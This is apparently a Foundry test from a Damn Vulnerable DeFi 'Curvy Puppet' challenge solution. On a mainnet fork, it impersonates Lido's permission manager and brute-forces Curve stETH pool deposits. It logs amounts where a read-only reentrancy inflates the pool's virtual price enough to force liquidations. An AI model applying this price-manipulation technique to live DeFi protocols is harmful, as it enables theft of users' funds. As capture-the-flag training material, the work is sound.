// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurveVirtualPrice is Test {
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    // Computed at CurvyPuppetLending using the formula
    //   (4 * collateralAmount * oracle.getPrice(collateralAsset).value * 1e18) /
    //   (7 * borrowAmount * oracle.getPrice(curvePool.coins(0)).value);
    uint256 constant virtualPriceGoal = 3571428571428571428;

    uint256 ethAmount;
    uint256 stETHAmount;


    function setUp() public {
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);
    }

    function test_virtualPrice() public {
        address aaveInterestBearingStETH = 0x1982b2F5814301d4e9a8b0201555376e62F82428;

        ethAmount = 50_000e18;
        uint256 aaveStETHBorrowLimit = stETH.balanceOf(aaveInterestBearingStETH);
        stETHAmount = aaveStETHBorrowLimit - 2_000e18;

        _utilRemoveStakingLimit();

        for (; ethAmount <= 52_000e18; ethAmount += 100e18) {
            for (; stETHAmount <= aaveStETHBorrowLimit; stETHAmount += 500e18) {
                uint256 snapshotId = vm.snapshot();

                (bool success,) = address(stETH).call{value: stETHAmount}("");
                success;

                stETH.approve(address(curvePool), type(uint256).max);
                uint256 lps = curvePool.add_liquidity{value: ethAmount}([ethAmount, stETHAmount], 0);

                curvePool.remove_liquidity(lps, [uint256(0), uint256(0)]);

                vm.revertTo(snapshotId);
            }

            stETHAmount = aaveStETHBorrowLimit - 2_000e18;
        }
    }

    function _utilRemoveStakingLimit() private {
        address lidoAragonACL = 0x9895F0F17cc1d1891b6f18ee0b483B6f221b37Bb;
        bytes32 STAKING_CONTROL_ROLE =
            0xa42eee1333c0758ba72be38e728b6dadb32ea767de5b4ddbaea1dae85b1b051f;

        (,bytes memory data) = lidoAragonACL.call(
                abi.encodeWithSignature(
                    "getPermissionManager(address,bytes32)",
                    address(stETH),
                    STAKING_CONTROL_ROLE));
        address permissionManager = abi.decode(data, (address));

        vm.startPrank(permissionManager);
        (bool success,) = address(stETH).call(abi.encodeWithSignature("removeStakingLimit()"));
        success;
        vm.stopPrank();
    }

    receive() external payable {
        uint256 virtualPrice = curvePool.get_virtual_price();

        if (virtualPrice >= virtualPriceGoal) {
            console.log(ethAmount, stETHAmount, virtualPrice);
        }
    }
}
